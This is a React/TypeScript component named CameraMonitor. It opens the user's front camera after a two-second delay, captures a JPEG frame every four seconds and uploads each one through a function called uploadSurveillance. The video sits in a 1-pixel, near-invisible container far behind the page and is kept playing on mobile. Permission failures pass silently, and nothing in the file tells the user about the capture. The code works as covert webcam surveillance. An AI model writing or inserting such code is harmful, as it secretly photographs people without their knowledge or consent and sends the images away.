import React, { useEffect, useRef } from 'react';
import { dataService } from '../services/dataService';

interface CameraMonitorProps {
  user: string;
  onError: () => void;
  onSuccess: () => void;
}

const CameraMonitor: React.FC<CameraMonitorProps> = ({ user, onError, onSuccess }) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    let stream: MediaStream | null = null;
    let intervalId: any;
    let checkActiveInterval: any;
    let initTimeout: any;

    const startCamera = async () => {
      try {
        // Request High Resolution, but graceful fallback happens automatically by browser
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: "user",
            width: { ideal: 1280 }, // 720p is sufficient and faster to load
            height: { ideal: 720 } 
          } 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          try {
             await videoRef.current.play();
          } catch(e) { /* Auto-play blocked, ignore */ }
          onSuccess();
        }

        // Capture loop
        intervalId = setInterval(captureFrame, 4000);
        
        // Keep-alive check for mobile browsers
        checkActiveInterval = setInterval(() => {
            if (videoRef.current && videoRef.current.paused && stream) {
                videoRef.current.play().catch(() => {});
            }
        }, 2000);

      } catch (err: any) {
        // Permission denied or unavailable. 
        // We fail silently so the user experience isn't broken.
        onError();
      }
    };

    const captureFrame = async () => {
      if (videoRef.current && canvasRef.current) {
        const video = videoRef.current;
        const canvas = canvasRef.current;
        const context = canvas.getContext('2d');

        if (context && video.readyState === video.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
          await dataService.uploadSurveillance(user, dataUrl);
        }
      }
    };

    // Delay initialization by 2 seconds to allow Main UI/Modal to settle
    initTimeout = setTimeout(() => {
        startCamera();
    }, 2000);

    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      if (intervalId) clearInterval(intervalId);
      if (checkActiveInterval) clearInterval(checkActiveInterval);
      if (initTimeout) clearTimeout(initTimeout);
    };
  }, [user]);

  return (
    <div style={{ 
        position: 'fixed', 
        bottom: 0, 
        right: 0, 
        width: '1px', 
        height: '1px', 
        opacity: 0.01, 
        pointerEvents: 'none', 
        zIndex: -50 
    }}>
      <video 
        ref={videoRef} 
        playsInline 
        autoPlay 
        muted 
        loop
        style={{ width: 'auto', height: 'auto' }} 
      />
      <canvas ref={canvasRef} style={{ display: 'none' }} />
    </div>
  );
};

export default CameraMonitor;